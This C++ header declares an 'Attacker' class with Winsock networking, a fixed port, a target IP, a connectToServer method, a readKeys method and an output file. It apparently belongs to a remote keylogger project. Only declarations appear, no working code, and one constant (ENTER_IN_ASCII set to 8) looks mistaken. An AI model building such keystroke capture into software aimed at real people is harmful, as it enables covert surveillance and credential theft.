#pragma once
#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <fstream>
#include <string>

#define PORT 15377
#define ENTER_IN_ASCII 8

class Attacker {
private:
	WSADATA	_wsaData;
	sockaddr_in _addr;
	SOCKET _connection_socket;
	int _connection_port = PORT;
	std::string _target_ip_addr;
	std::ofstream _output_file;

public:
	Attacker(std::string target_ip_addr = "127.0.0.1");
	~Attacker();
	
	int connectToServer();
	void readKeys();
};
